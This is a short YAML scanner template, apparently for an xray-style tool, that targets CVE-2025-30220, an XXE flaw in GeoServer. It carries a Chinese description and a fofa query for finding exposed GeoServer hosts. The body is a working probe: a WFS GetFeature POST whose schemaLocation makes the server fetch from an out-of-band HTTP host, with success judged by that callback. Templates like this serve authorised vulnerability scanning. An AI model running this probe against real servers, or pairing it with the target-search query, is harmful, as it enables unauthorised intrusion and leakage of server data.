id: CVE-2025-30220
info:
  name: GeoServer XXE 漏洞
  author: avic123
  severity: critical
  verified: true
  description: |
    GeoServer是GeoServer开源的一个用 Java 编写的开源软件服务器。允许用户共享和编辑地理空间数据。GeoServer存在代码问题漏洞，该漏洞源于XML外部实体处理不当，可能导致信息泄露。
    fofa：app="GeoServer"
  reference:
    - https://mp.weixin.qq.com/s/9tEZR2xu_DX5a8cC_ZP_bw
  created: 2025/06/24

set:
  oob: oob()
  oobHTTP: oob.HTTP
  hostname: request.url.host

rules:
  r0:
    request:
      method: POST
      path: /geoserver/wfs
      headers:
        Content-Type: application/xml
      body: |-
        <wfs:GetFeature service="WFS" version="1.0.0"
        xmlns:wfs="http://www.opengis.net/wfs"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:topp="http://www.openplans.org/topp"
        xsi:schemaLocation="http://a {{oobHTTP}}/xxe.xsd"
        outputFormat="KML">
        <wfs:Query typeName="topp:states"/>
        </wfs:GetFeature>
    expression: response.status == 200 && oobCheck(oob, oob.ProtocolHTTP, 3)

expression: r0()
